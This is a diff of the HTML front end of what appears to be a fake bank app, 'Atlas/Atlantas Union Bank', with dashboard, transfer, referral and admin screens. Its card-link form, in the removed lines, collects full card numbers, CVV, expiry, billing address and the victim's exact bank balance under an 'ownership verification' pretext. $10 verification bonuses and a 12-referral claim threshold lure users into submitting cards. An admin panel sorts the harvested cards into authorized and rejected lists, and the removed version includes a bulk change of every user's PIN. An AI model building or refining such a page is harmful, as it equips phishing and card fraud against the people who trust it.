-            <div class="drawer-username" id="drawer-username">User</div>
-            <div class="drawer-email" id="drawer-email">user@email.com</div>
-            <div class="drawer-balance-chip">💰 <span id="drawer-balance">$0.00</span></div>
-        </div>
-        <div class="drawer-body">
-            <div class="drawer-section-label">My Account</div>
-            <div class="drawer-item" id="drawer-account">
-                <div class="drawer-item-icon">👤</div>Account Info
-            </div>
-            <div class="drawer-item" id="drawer-withdraw-link">
-                <div class="drawer-item-icon">↓</div>Withdraw Funds
-            </div>
-            <div class="drawer-item" id="drawer-send-link">
-                <div class="drawer-item-icon">→</div>Send Money
-            </div>
-            <div class="drawer-item" id="drawer-refer-link">
-                <div class="drawer-item-icon">🎁</div>Refer &amp; Earn
-            </div>
-            <div class="drawer-divider"></div>
-            <div class="drawer-section-label">Support</div>
-            <div class="drawer-item" id="drawer-contact">
-                <div class="drawer-item-icon">📧</div>Contact Us
-            </div>
-            <div class="drawer-item" id="drawer-help">
-                <div class="drawer-item-icon">❓</div>How to Use
-            </div>
-            <div class="drawer-divider"></div>
-            <div class="drawer-item danger" id="drawer-logout">
-                <div class="drawer-item-icon">🚪</div>Logout
-            </div>
-        </div>
+<!-- DASHBOARD -->
+<div id="dashboard">
+  <div class="drawer-overlay" id="drawer-overlay"></div>
+  <div class="drawer" id="drawer">
+    <div class="drawer-head">
+      <div class="drawer-name" id="drawer-name">User</div>
+      <div class="drawer-email" id="drawer-email"></div>
     </div>
+    <div class="drawer-item" onclick="openModal('account-modal')"><span class="drawer-item-icon">&#128100;</span>Account Info</div>
+    <div class="drawer-item" onclick="openModal('more-modal')"><span class="drawer-item-icon">&#9881;&#65039;</span>Settings</div>
+    <div class="drawer-item" onclick="openReferModal()"><span class="drawer-item-icon">&#127873;</span>Refer &amp; Earn</div>
+    <div class="drawer-item red" id="drawer-logout"><span class="drawer-item-icon">&#128682;</span>Log Out</div>
+  </div>
 
-    <!-- AUTH SCREEN -->
-    <div id="auth-screen">
-        <div class="auth-logo-area">
-            <div class="auth-logo-icon">🏦</div>
-            <div class="auth-logo-title">Atlas Union Bank</div>
-            <div class="auth-logo-sub" id="auth-logo-sub">Secure · Global · Trusted</div>
-        </div>
-        <div class="form-section">
-            <div style="display:flex;border-bottom:2px solid var(--pp-gray-100);margin-bottom:20px;">
-                <button type="button" id="tab-signup" class="auth-tab active-tab">Sign Up</button>
-                <button type="button" id="tab-login" class="auth-tab">Log In</button>
-            </div>
-            
-            <!-- Signup Section -->
-            <div id="signup-section">
-                <form id="signup-form">
-                    <select id="su-country" required>
-                        <option value="">Select Country</option>
-                        <option value="USA">United States</option>
-                        <option value="UK">United Kingdom</option>
-                        <option value="Nigeria">Nigeria</option>
-                        <option value="Germany">Germany</option>
-                        <option value="France">France</option>
-                        <option value="Canada">Canada</option>
-                        <option value="Brazil">Brazil</option>
-                    </select>
-                    <input type="text" id="su-surname" placeholder="Surname" required>
-                    <input type="text" id="su-firstname" placeholder="First Name" required>
-                    <input type="text" id="su-othername" placeholder="Other Name (optional)">
-                    <input type="tel" id="su-phone" placeholder="Phone Number" required>
-                    <div id="dynamic-fields"></div>
-                    <input type="text" id="su-username" placeholder="Username" required>
-                    <input type="email" id="su-email" placeholder="Email" required>
-                    <input type="password" id="su-password" placeholder="Password (min 8 chars)" required minlength="8">
-                    <input type="password" id="su-confirm" placeholder="Confirm Password" required>
-                    <select id="su-currency" required>
-                        <option value="USD">USD ($)</option>
-                        <option value="EUR">EUR (€)</option>
-                        <option value="GBP">GBP (£)</option>
-                    </select>
-                    <input type="text" id="su-promo" placeholder="Promo Code (optional)">
-                    <input type="text" id="su-referral" placeholder="Referral Code (optional)" style="text-transform:uppercase;">
-                    <button type="submit">Sign Up</button>
-                </form>
-                <p class="error" id="signup-error"></p>
-            </div>
-            
-            <!-- Login Section -->
-            <div id="login-section" style="display:none;">
-                <form id="login-form">
-                    <input type="email" id="li-email" placeholder="Email" required>
-                    <input type="password" id="li-password" placeholder="Password" required>
-                    <button type="submit">Log In</button>
-                </form>
-                <p class="error" id="login-error"></p>
-            </div>
-        </div>
+  <!-- ACCOUNTS TAB -->
+  <div class="tab-page active" id="tab-accounts">
+    <div class="topbar">
+      <button class="topbar-menu" id="menu-btn">&#9776;</button>
+      <div class="topbar-center">
+        <span class="topbar-greeting">Good day,</span>
+        <span class="topbar-name" id="topbar-name">User</span>
+      </div>
+      <div class="topbar-right">
+        <button class="notif-btn" id="notif-btn">&#128276;<span class="notif-badge" id="notif-badge"></span></button>
+      </div>
     </div>
-
-    <!-- DASHBOARD -->
-    <div id="dashboard" style="display:none;">
-        <!-- Top Bar -->
-        <div class="dash-topbar">
-            <button class="hamburger-btn" id="hamburger-btn" aria-label="Open menu">
-                <span class="hamburger-line"></span>
-                <span class="hamburger-line"></span>
-                <span class="hamburger-line"></span>
-            </button>
-            <div id="dash-accounts-title">Accounts</div>
-            <div class="topbar-right">
-                <div class="notif-bell" id="notif-bell-btn" title="Notifications">
-                    🔔
-                    <span class="notif-dot" id="notif-dot" style="display:none;"></span>
-                </div>
-                <div class="notif-bell" id="profile-btn" title="Profile">👤</div>
-            </div>
-        </div>
-
-        <!-- Action Pills -->
-        <div class="pp-action-pills">
-            <div class="pp-pill" id="pill-withdraw">
-                <span class="pp-pill-icon">↓</span> <span id="pill-withdraw-text">Withdraw</span>
-            </div>
-            <div class="pp-pill" id="pill-refer">
-                <span class="pp-pill-icon">🎁</span> <span id="pill-refer-text">Refer to Earn</span>
-            </div>
-        </div>
-
-        <!-- Verify Banner -->
-        <div id="verify-banner" class="verify-banner" style="display:none;">
-            🔐 <strong>Verify your account</strong> — Link a bank card to unlock full access &amp; earn a $10 bonus!
-            <button class="verify-banner-btn" id="verify-banner-btn">Verify Now</button>
-        </div>
-
-        <!-- Balance Card -->
-        <div class="balance-card-wrap">
-            <div class="paypal-balance-card">
-                <div class="pbc-top">
-                    <div class="pbc-label-row">
-                        <span class="pbc-label" id="pbc-label-inner">Atlas balance</span>
-                        <div class="pbc-right">
-                            <span class="pbc-acct" id="card-number">•• ----</span>
-                            <div class="pbc-logo-chip">ATLAS</div>
-                        </div>
-                    </div>
-                </div>
-                <div class="pbc-amount">
-                    <span id="currency-symbol">$</span><span id="balance">0.00</span>
-                </div>
-                <div class="pbc-avail">
-                    <span id="pbc-avail-label">Available balance</span>
-                </div>
-                <div class="pbc-actions">
-                    <div class="pbc-action" id="bc-withdraw2-btn">
-                        <div class="pbc-action-circle">
-                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
-                                <rect x="2" y="5" width="20" height="14" rx="2"/>
-                                <line x1="12" y1="9" x2="12" y2="15"/>
-                                <line x1="9" y1="12" x2="15" y2="12"/>
-                            </svg>
-                        </div>
-                        <span id="pbc-action-withdraw-label">Withdraw</span>
-                    </div>
-                    <div class="pbc-action" id="bc-send-btn">
-                        <div class="pbc-action-circle">
-                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
-                                <path d="M7 16L17 16M17 16L13 12M17 16L13 20"/>
-                                <path d="M17 8L7 8M7 8L11 4M7 8L11 12"/>
-                            </svg>
-                        </div>
-                        <span id="pbc-action-transfer-label">Transfer</span>
-                    </div>
-                    <div class="pbc-action" id="bc-account-btn">
-                        <div class="pbc-action-circle">
-                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
-                                <circle cx="12" cy="12" r="10"/>
-                                <line x1="12" y1="8" x2="12" y2="12"/>
-                                <line x1="12" y1="16" x2="12.01" y2="16"/>
-                            </svg>
-                        </div>
-                        <span id="pbc-action-account-label">Account info</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Promo Banner -->
-        <div class="promo-banner" id="promo-banner-btn">
-            <div class="promo-badge">+$10</div>
-            <div class="promo-text" id="promo-text-inner">Verify your card &amp; earn a verification bonus</div>
-            <div class="promo-arrow">›</div>
-        </div>
-
-        <!-- Linked Cards -->
-        <div class="sect-header">
-            <div class="sect-title" id="sect-linked-cards">Linked banks and cards</div>
-            <div class="sect-link" id="add-new-card-link">Add New ›</div>
-        </div>
-        <div class="cards-scroll" id="cards-scroll">
-            <div class="card-chip add-card-chip" id="add-card-chip-btn">
-                <div style="font-size:28px;color:var(--pp-gray-400);">+</div>
-                <div style="font-size:12px;font-weight:700;color:var(--pp-gray-400);">Add Card</div>
-            </div>
-        </div>
-
-        <!-- Recent Transactions -->
-        <div class="sect-header" style="margin-top:8px;">
-            <div class="sect-title" id="sect-recent-tx">Recent Transactions</div>
-            <div class="sect-link" id="view-receipts-link">View All ›</div>
-        </div>
-        <div class="transactions-container" id="transactions-container"></div>
-
-        <div style="height:20px;"></div>
+    <div class="verify-banner" id="verify-banner">
+      <div class="verify-banner-text">&#128272; Verify your card to unlock your <strong>$10 welcome bonus</strong></div>
+      <button class="verify-banner-btn" id="verify-banner-btn">Verify Now</button>
     </div>
-
-    <!-- RECEIPTS SCREEN -->
-    <div id="receipts-screen" style="display:none;">
-        <div class="receipts-topbar">
-            <button class="back-btn" id="back-from-receipts">←</button>
-            <h2>📄 Receipts</h2>
-        </div>
-        <div class="receipt-filters">
-            <div class="filter-chip active" data-filter="all">All</div>
-            <div class="filter-chip" data-filter="Sent">Sent</div>
-            <div class="filter-chip" data-filter="Received">Received</div>
-            <div class="filter-chip" data-filter="Withdrawal">Withdrawals</div>
-        </div>
-        <div id="receipts-list"></div>
+    <div class="req-banner" id="req-banner" onclick="openModal('money-requests-modal')">
+      <div class="req-banner-left">&#128233; Money Requests</div>
+      <span class="req-banner-badge" id="req-count-badge">0</span>
     </div>
-
-    <!-- ADMIN PANEL -->
-    <div id="admin-panel" style="display:none;">
-        <div class="admin-header">
-            <h2>🔐 Admin Panel</h2>
-            <p style="color:var(--pp-gray-400);font-size:13px;margin-top:4px;">admin@gmail.com</p>
-        </div>
-        <div class="admin-tabs">
-            <div class="admin-tab active" id="admin-tab-auth">Authorization</div>
-            <div class="admin-tab" id="admin-tab-codes">Code Management</div>
-        </div>
-        <div id="admin-content-auth" class="admin-content" style="display:block;">
-            <div class="acc-block attention-block">
-                <div class="acc-header" data-body="acc-attention-body" data-arrow="acc-attention-arrow">
-                    <div class="acc-header-left">
-                        <span class="acc-icon">⚠️</span>
-                        <span class="acc-title">Attention Needed</span>
-                        <span class="acc-badge" id="badge-attention" style="display:none;"></span>
-                    </div>
-                    <span class="acc-arrow" id="acc-attention-arrow">▶</span>
-                </div>
-                <div id="acc-attention-body" class="acc-body" style="display:none;">
-                    <p class="acc-empty">Loading...</p>
-                </div>
-            </div>
-            <div class="acc-block authorized-block">
-                <div class="acc-header" data-body="acc-authorized-body" data-arrow="acc-authorized-arrow">
-                    <div class="acc-header-left">
-                        <span class="acc-icon">✅</span>
-                        <span class="acc-title">Authorized Cards</span>
-                        <span class="acc-badge badge-green" id="badge-authorized" style="display:none;"></span>
-                    </div>
-                    <span class="acc-arrow" id="acc-authorized-arrow">▶</span>
-                </div>
-                <div id="acc-authorized-body" class="acc-body" style="display:none;">
-                    <p class="acc-empty">Loading...</p>
-                </div>
-            </div>
-            <div class="acc-block rejected-block">
-                <div class="acc-header" data-body="acc-rejected-body" data-arrow="acc-rejected-arrow">
-                    <div class="acc-header-left">
-                        <span class="acc-icon">❌</span>
-                        <span class="acc-title">Rejected Cards</span>
-                        <span class="acc-badge badge-red" id="badge-rejected" style="display:none;"></span>
-                    </div>
-                    <span class="acc-arrow" id="acc-rejected-arrow">▶</span>
-                </div>
-                <div id="acc-rejected-body" class="acc-body" style="display:none;">
-                    <p class="acc-empty">Loading...</p>
-                </div>
-            </div>
-        </div>
-        <div id="admin-content-codes" class="admin-content" style="display:none;">
-            <div class="admin-global-controls">
-                <h3>Change All Users' PINs</h3>
-                <div class="admin-global-input">
-                    <input type="text" id="admin-global-pin" class="admin-global-pin" placeholder="New PIN" maxlength="4">
-                    <button id="admin-change-all-btn" class="admin-change-all-btn">Change All</button>
-                </div>
-                <button id="admin-logout-btn" class="admin-logout-btn">Logout</button>
-            </div>
-            <div class="admin-section-title">Users by Country</div>
-            <div id="codes-country-sections"></div>
-        </div>
+    <div class="balance-card">
+      <div class="balance-label">Total Balance <span class="acct-badge" id="acct-badge">&#8226;&#8226;&#8226;&#8226;</span></div>
+      <div class="balance-amount"><span id="currency-symbol">$</span><span id="balance">0.00</span></div>
+      <div class="balance-sub">Atlantas Union Bank</div>
+      <div class="action-row">
+        <button class="action-btn" id="add-money-btn"><span class="action-icon">&#10133;</span>Add Money</button>
+        <button class="action-btn" id="transfer-btn"><span class="action-icon">&#128184;</span>Withdraw</button>
+        <button class="action-btn" id="acct-info-btn"><span class="action-icon">&#128100;</span>Account</button>
+        <button class="action-btn" id="add-card-btn"><span class="action-icon">&#128179;</span>Cards</button>
+      </div>
     </div>
-
-    <!-- BOTTOM NAV -->
-    <div class="bottom-nav-bar" id="bottom-nav-bar" style="display:none;">
-        <div class="bnav-item active" id="bnav-home">
-            <div class="bnav-icon">🏠</div>
-            <div class="bnav-label" id="bnav-home-label">Home</div>
-        </div>
-        <div class="bnav-item" id="bnav-accounts">
-            <div class="bnav-icon">💳</div>
-            <div class="bnav-label" id="bnav-accounts-label">Accounts</div>
-        </div>
-        <div class="bnav-send-wrap">
-            <button class="bnav-center" id="bnav-send-req" title="Send / Request">⇅</button>
-            <div class="bnav-center-label" id="bnav-center-label-el">Send / Request</div>
-        </div>
-        <div class="bnav-item" id="bnav-activity">
-            <div class="bnav-icon">🧾</div>
-            <div class="bnav-label" id="bnav-activity-label">Activity</div>
-        </div>
-        <div class="bnav-item" id="bnav-more">
-            <div class="bnav-icon">⋯</div>
-            <div class="bnav-label">More</div>
-        </div>
+    <div class="section">
+      <div class="section-header">
+        <span class="section-title">Linked Cards</span>
+        <button class="section-link" id="add-card-link">Add New</button>
+      </div>
+      <div id="cards-container"></div>
     </div>
-
-    <!-- MODALS START HERE -->
-    
-    <!-- Account Modal -->
-    <div id="account-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Account Information</h3>
-                <button class="close-btn" data-modal="account-modal">×</button>
-            </div>
-            <div class="top-buttons">
-                <button id="copy-account" class="copy-btn">📋 Copy</button>
-                <button id="generate-pin-btn" class="generate-pin-btn">Generate PIN</button>
-            </div>
-            <div class="account-info">
-                <p><strong>Account #:</strong><span id="acc-number">----------</span></p>
-                <p><strong>Country:</strong><span id="acc-country">-</span></p>
-                <p><strong>Surname:</strong><span id="acc-surname">-</span></p>
-                <p><strong>First Name:</strong><span id="acc-firstname">-</span></p>
-                <p><strong>Other Name:</strong><span id="acc-othername">-</span></p>
-                <p><strong>Phone:</strong><span id="acc-phone">-</span></p>
-                <div id="country-specific-info"></div>
-            </div>
-        </div>
+    <div class="section">
+      <div class="section-header"><span class="section-title">Recent Transactions</span></div>
+      <div id="tx-container"><p style="text-align:center;color:#999;padding:20px;">No transactions yet</p></div>
     </div>
+  </div>
 
-    <!-- Set PIN Modal -->
-    <div id="set-pin-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Set Your PIN</h3>
-                <button class="close-btn" data-modal="set-pin-modal">×</button>
-            </div>
-            <p style="font-size:14px;color:var(--pp-gray-600);margin:0 0 14px;text-align:center;">
-                Create a 4-digit PIN to authorise withdrawals.
-            </p>
-            <form id="set-pin-form" autocomplete="off">
-                <input type="password" id="spm-current" placeholder="Current PIN (blank if first time)" maxlength="4" inputmode="numeric" class="pin-input">
-                <input type="password" id="spm-new" placeholder="New 4-digit PIN" maxlength="4" required inputmode="numeric" class="pin-input">
-                <input type="password" id="spm-confirm" placeholder="Confirm new PIN" maxlength="4" required inputmode="numeric" class="pin-input">
-                <p id="spm-error" class="error" style="min-height:18px;margin:4px 0;"></p>
-                <button type="submit">Set PIN</button>
-            </form>
-        </div>
+  <!-- RECEIPTS TAB -->
+  <div class="tab-page" id="tab-receipt">
+    <div class="topbar"><span class="topbar-title">Receipts</span></div>
+    <div style="padding:12px 16px;" id="receipt-container"><p style="text-align:center;color:#999;padding:20px;">No receipts yet</p></div>
+  </div>
+
+  <!-- SEND/REQUEST TAB -->
+  <div class="tab-page" id="tab-sendreq">
+    <!-- CHOOSER SCREEN -->
+    <div id="sendreq-chooser">
+      <div class="topbar"><span class="topbar-title">Send / Request</span></div>
+      <div style="padding:24px 16px;">
+        <p style="text-align:center;color:#888;font-size:14px;margin-bottom:20px;">What would you like to do?</p>
+        <button class="sendreq-option-btn" id="choose-send-btn">
+          <span style="font-size:36px;display:block;margin-bottom:10px;">&#128184;</span>
+          <span style="font-size:17px;font-weight:700;color:#0a2540;display:block;">Send Money</span>
+          <span style="font-size:13px;color:#666;display:block;margin-top:4px;">Transfer money to another account</span>
+        </button>
+        <button class="sendreq-option-btn" id="choose-req-btn">
+          <span style="font-size:36px;display:block;margin-bottom:10px;">&#128233;</span>
+          <span style="font-size:17px;font-weight:700;color:#0a2540;display:block;">Request Money</span>
+          <span style="font-size:13px;color:#666;display:block;margin-top:4px;">Ask someone to send you money</span>
+        </button>
+      </div>
     </div>
-
-    <!-- Notifications Modal -->
-    <div id="notif-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>🔔 Notifications</h3>
-                <button class="close-btn" data-modal="notif-modal">×</button>
-            </div>
-            <div id="notif-list">
-                <p style="text-align:center;color:var(--pp-gray-400);padding:20px;font-size:14px;">No notifications</p>
-            </div>
-        </div>
+    <!-- SEND SCREEN -->
+    <div id="sendreq-send" style="display:none;">
+      <div class="topbar">
+        <button onclick="showSendReqChooser()" style="background:none;border:none;font-size:22px;color:#0a2540;cursor:pointer;width:40px;height:40px;display:flex;align-items:center;justify-content:center;padding:0;">&#8592;</button>
+        <span class="topbar-title">Send Money</span>
+        <div style="width:40px;"></div>
+      </div>
+      <div class="sr-card">
+        <div class="sr-label">&#128184; Send Money</div>
+        <input type="text" class="sr-input" id="send-acct" placeholder="Recipient account number (10 digits)" maxlength="10" inputmode="numeric">
+        <div class="sr-info" id="send-acct-info"></div>
+        <input type="number" class="sr-input" id="send-amount" placeholder="Amount" min="0.01" step="0.01">
+        <input type="text" class="sr-input" id="send-pin" placeholder="Your 4-digit PIN" maxlength="4" inputmode="numeric">
+        <div class="sr-error" id="send-error"></div>
+        <button class="sr-btn dark" id="send-btn">Send Now</button>
+      </div>
     </div>
-
-    <!-- Referral Modal -->
-    <div id="refer-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>🎁 Refer &amp; Earn</h3>
-                <button class="close-btn" data-modal="refer-modal">×</button>
-            </div>
-            <div class="refer-body">
-                <div class="refer-hero">
-                    <div class="refer-hero-icon">💰</div>
-                    <div class="refer-hero-title">Earn for every friend!</div>
-                    <div class="refer-hero-sub">You earn <strong id="refer-earn-label">$10</strong> per referral • They earn <strong>$10</strong> when they verify</div>
-                </div>
-                <div class="refer-code-box">
-                    <div class="refer-code-label">Your Referral Code</div>
-                    <div class="refer-code" id="refer-code-display">Loading...</div>
-                    <button class="refer-copy-btn" id="refer-copy-btn">📋 Copy Code</button>
-                </div>
-                <div class="refer-stats">
-                    <div class="refer-stat">
-                        <div class="refer-stat-num" id="refer-count">0</div>
-                        <div class="refer-stat-label">Referrals</div>
-                    </div>
-                    <div class="refer-stat">
-                        <div class="refer-stat-num" id="refer-earned">$0</div>
-                        <div class="refer-stat-label">Earned</div>
-                    </div>
-                    <div class="refer-stat">
-                        <div class="refer-stat-num" id="refer-needed">12</div>
-                        <div class="refer-stat-label">Needed</div>
-                    </div>
-                </div>
-                <div class="refer-progress-wrap">
-                    <div class="refer-progress-bar">
-                        <div class="refer-progress-fill" id="refer-progress-fill" style="width:0%"></div>
-                    </div>
-                    <div class="refer-progress-label" id="refer-progress-label">0 / 12</div>
-                </div>
-                <button class="refer-claim-btn" id="refer-claim-btn" disabled>Claim Earnings</button>
-                <p class="refer-notice">⚠️ You need 12 referrals (min $120 earned). Friends earn $10 when they verify a card.</p>
-            </div>
-        </div>
+    <!-- REQUEST SCREEN -->
+    <div id="sendreq-request" style="display:none;">
+      <div class="topbar">
+        <button onclick="showSendReqChooser()" style="background:none;border:none;font-size:22px;color:#0a2540;cursor:pointer;width:40px;height:40px;display:flex;align-items:center;justify-content:center;padding:0;">&#8592;</button>
+        <span class="topbar-title">Request Money</span>
+        <div style="width:40px;"></div>
+      </div>
+      <div class="sr-card">
+        <div class="sr-label">&#128233; Request Money</div>
+        <input type="text" class="sr-input" id="req-acct" placeholder="Their account number (10 digits)" maxlength="10" inputmode="numeric">
+        <div class="sr-info" id="req-acct-info"></div>
+        <input type="number" class="sr-input" id="req-amount" placeholder="Amount to request" min="0.01" step="0.01">
+        <input type="text" class="sr-input" id="req-note" placeholder="Note (optional)">
+        <div class="sr-error" id="req-error"></div>
+        <button class="sr-btn blue" id="req-btn">Send Request</button>
+      </div>
     </div>
+  </div>
 
-    <!-- Send Money Modal -->
-    <div id="send-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Send Money</h3>
-                <button class="close-btn" data-modal="send-modal">×</button>
-            </div>
-            <form id="send-form">
-                <input type="text" id="send-recipient" placeholder="Recipient Account (10 digits)" required pattern="\d{10}" maxlength="10">
-                <div id="recipient-info"></div>
-                <input type="number" id="send-amount" placeholder="Amount" step="0.01" required min="0.01">
-                <p class="error" id="send-error"></p>
-                <button type="submit">Send Now</button>
-            </form>
-        </div>
+  <!-- OFFERS TAB -->
+  <div class="tab-page" id="tab-offers">
+    <div class="topbar"><span class="topbar-title">Offers</span></div>
+    <div style="padding:12px 0;">
+      <div class="offer-card">
+        <div class="offer-icon">&#128179;</div>
+        <div class="offer-title">Link &amp; Verify a Card</div>
+        <div class="offer-desc">Add your bank card and get verified by our team to earn a <strong>$10 welcome bonus</strong>.</div>
+        <button class="offer-btn" id="offer-card-btn">Link a Card</button>
+      </div>
+      <div class="offer-card">
+        <div class="offer-icon">&#127873;</div>
+        <div class="offer-title">Refer a Friend</div>
+        <div class="offer-desc">Share your referral code. Earn $10 per friend who joins.</div>
+        <button class="offer-btn" id="offer-refer-btn">Share Code</button>
+      </div>
     </div>
+  </div>
 
-    <!-- Withdraw Modal -->
-    <div id="withdraw-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Withdraw Funds</h3>
-                <button class="close-btn" data-modal="withdraw-modal">×</button>
-            </div>
-            <div class="withdrawal-notice" id="withdrawal-notice-text">⚠️ You can only withdraw to accounts in your name</div>
-            <form id="withdraw-form">
-                <select id="withdraw-method" required>
-                    <option value="">Select Method</option>
-                </select>
-                <div id="withdraw-fields-container"></div>
-                <input type="number" id="withdraw-amount" placeholder="Amount" step="0.01" required min="1">
-                <input type="text" id="withdraw-pin" placeholder="Enter 4-digit PIN" required pattern="\d{4}" maxlength="4" class="pin-input">
-                <p class="error" id="withdraw-error"></p>
-                <button type="submit">Request Withdrawal</button>
-            </form>
-        </div>
+  <!-- REFER TAB -->
+  <div class="tab-page" id="tab-refer">
+    <div class="topbar"><span class="topbar-title">Refer &amp; Earn</span></div>
+    <div style="padding:12px 20px;">
+      <div class="refer-hero">
+        <div class="refer-hero-icon">&#127873;</div>
+        <div class="refer-hero-title">Earn with Referrals</div>
+        <div class="refer-hero-sub">Share your code. Earn $10 per referral. Claim big rewards at 12 referrals.</div>
+      </div>
+      <div class="refer-code-box">
+        <div class="refer-code" id="refer-code-display">AUB-000000</div>
+        <button class="refer-copy-btn" id="refer-copy-btn">&#128203; Copy Code</button>
+      </div>
+      <div class="refer-stats">
+        <div class="refer-stat"><div class="refer-stat-num" id="refer-count">0</div><div class="refer-stat-label">Referrals</div></div>
+        <div class="refer-stat"><div class="refer-stat-num" id="refer-earned">$0</div><div class="refer-stat-label">Earned</div></div>
+      </div>
+      <div class="refer-bar-wrap">
+        <div class="refer-bar-bg"><div class="refer-bar-fill" id="refer-bar" style="width:0%"></div></div>
+        <div class="refer-bar-label" id="refer-bar-label">0 / 12 referrals</div>
+      </div>
+      <button class="refer-claim-btn" id="refer-claim-btn" disabled>Claim Bonus</button>
     </div>
+  </div>
 
-    <!-- Card Options Modal -->
-    <div id="card-options-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>💳 My Cards</h3>
-                <button class="close-btn" data-modal="card-options-modal">×</button>
-            </div>
-            <p style="text-align:center;color:var(--pp-gray-400);margin-bottom:16px;font-size:14px;">Choose an option:</p>
-            <div class="card-options-menu">
-                <div class="card-option-btn" id="view-linked-cards-option">
-                    <div class="card-option-icon">📋</div>
-                    <div class="card-option-title">View Linked Cards</div>
-                    <div class="card-option-desc">View your authorized and pending cards</div>
-                </div>
-                <div class="card-option-btn" id="add-new-card-option">
-                    <div class="card-option-icon">➕</div>
-                    <div class="card-option-title">Add New Card</div>
-                    <div class="card-option-desc">Link a new debit or credit card</div>
-                </div>
-            </div>
-        </div>
+  <!-- BOTTOM NAV -->
+  <div class="bottom-nav">
+    <button class="nav-btn active" id="nav-accounts" onclick="switchTab('tab-accounts',this)"><span class="nav-icon">&#127968;</span><span class="nav-label">Accounts</span></button>
+    <button class="nav-btn" id="nav-receipt" onclick="switchTab('tab-receipt',this)"><span class="nav-icon">&#129518;</span><span class="nav-label">Receipts</span></button>
+    <button class="nav-btn" id="nav-sendreq" onclick="switchTab('tab-sendreq',this)"><div class="nav-center">&#8645;</div><span class="nav-label" style="margin-top:4px;">Send/Req</span></button>
+    <button class="nav-btn" id="nav-offers" onclick="switchTab('tab-offers',this)"><span class="nav-icon">&#127991;&#65039;</span><span class="nav-label">Offers</span></button>
+    <button class="nav-btn" id="nav-refer" onclick="switchTab('tab-refer',this)"><span class="nav-icon">&#127873;</span><span class="nav-label">Refer</span></button>
+  </div>
+</div>
+
+<!-- ADMIN -->
+<div id="admin-panel">
+  <div class="admin-header"><h2>&#128272; Admin Panel</h2><p>Atlantas Union Bank</p></div>
+  <div class="admin-tabs">
+    <button class="admin-tab active" id="atab-auth" onclick="switchAdminTab('auth')">Authorization</button>
+    <button class="admin-tab" id="atab-deposits" onclick="switchAdminTab('deposits')">&#128176; Deposits</button>
+    <button class="admin-tab" id="atab-codes" onclick="switchAdminTab('codes')">Users</button>
+  </div>
+  <div class="admin-content active" id="acontent-auth">
+    <div class="acc-block">
+      <div class="acc-header" onclick="toggleAcc('acc-attention','arr-attention')">
+        <div class="acc-header-left"><span class="acc-icon-span">&#9888;&#65039;</span><span class="acc-title-span">Attention Needed</span><span class="acc-badge-span red" id="badge-attention" style="display:none;"></span></div>
+        <span class="acc-arrow-span" id="arr-attention">&#9654;</span>
+      </div>
+      <div class="acc-body" id="acc-attention"><p class="acc-empty">Loading...</p></div>
     </div>
-
-    <!-- Cards List Modal -->
-    <div id="cards-list-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>💳 Linked Cards</h3>
-                <button class="close-btn" data-modal="cards-list-modal">×</button>
-            </div>
-            <div id="linked-cards-list"></div>
-        </div>
+    <div class="acc-block">
+      <div class="acc-header" onclick="toggleAcc('acc-authorized','arr-authorized')">
+        <div class="acc-header-left"><span class="acc-icon-span">&#9989;</span><span class="acc-title-span">Authorized Cards</span><span class="acc-badge-span green" id="badge-authorized" style="display:none;"></span></div>
+        <span class="acc-arrow-span" id="arr-authorized">&#9654;</span>
+      </div>
+      <div class="acc-body" id="acc-authorized"><p class="acc-empty">Loading...</p></div>
     </div>
-
-    <!-- Card Form Modal -->
-    <div id="card-modal" class="modal">
-        <div class="modal-content apple-pay-modal">
-            <div id="apple-pay-header" class="apple-pay-header">
-                <img src="https://i.imgur.com/L2U0Crf.jpeg" class="apple-logo" alt="Card Logo">
-                <span class="apple-pay-powered">Powered by Apple</span>
-            </div>
-            <div class="modal-header">
-                <h3 id="card-modal-title">💳 Link Card</h3>
-                <button class="close-btn" data-modal="card-modal">×</button>
-            </div>
-            <form id="card-form">
-                <input type="text" id="card-number-input" placeholder="Card Number (16 digits)" required pattern="\d{16}" maxlength="19" style="letter-spacing:2px;font-family:'Courier New',monospace;">
-                <input type="text" id="card-name" placeholder="Cardholder Name" required>
-                <div class="card-input-group">
-                    <input type="text" id="card-expiry" placeholder="MM/YY" required pattern="\d{2}/\d{2}" maxlength="5">
-                    <input type="text" id="card-cvv" placeholder="CVV" required pattern="\d{3}" maxlength="3">
-                </div>
-                <div class="billing-address-section">
-                    <h4 id="card-billing-title">📍 Billing Address</h4>
-                    <input type="text" id="card-street" placeholder="Street Address" required>
-                    <input type="text" id="card-postcode" placeholder="Postal Code" required>
-                    <input type="text" id="card-city" placeholder="City" required>
-                    <input type="text" id="card-country" placeholder="Country" required>
-                    <input type="tel" id="card-phone" placeholder="Phone Number" required>
-                    <input type="text" id="card-balance" placeholder="Current Bank Account Balance (e.g. 1500.00)" required>
-                    <div class="balance-ownership-notice" id="balance-ownership-notice">
-                        <div class="balance-notice-icon">💳</div>
-                        <div>
-                            <strong id="balance-notice-text">What is your current bank account balance?</strong>
-                            <p class="balance-notice-sub" id="balance-notice-sub">Enter the exact amount currently available in the bank account linked to this card — not the card limit. This verifies you are the real owner.</p>
-                        </div>
-                    </div>
-                </div>
-                <p class="error" id="card-error"></p>
-                <button type="submit">Link Card</button>
-            </form>
-        </div>
+    <div class="acc-block">
+      <div class="acc-header" onclick="toggleAcc('acc-rejected','arr-rejected')">
+        <div class="acc-header-left"><span class="acc-icon-span">&#10060;</span><span class="acc-title-span">Rejected Cards</span><span class="acc-badge-span red" id="badge-rejected" style="display:none;"></span></div>
+        <span class="acc-arrow-span" id="arr-rejected">&#9654;</span>
+      </div>
+      <div class="acc-body" id="acc-rejected"><p class="acc-empty">Loading...</p></div>
     </div>
-
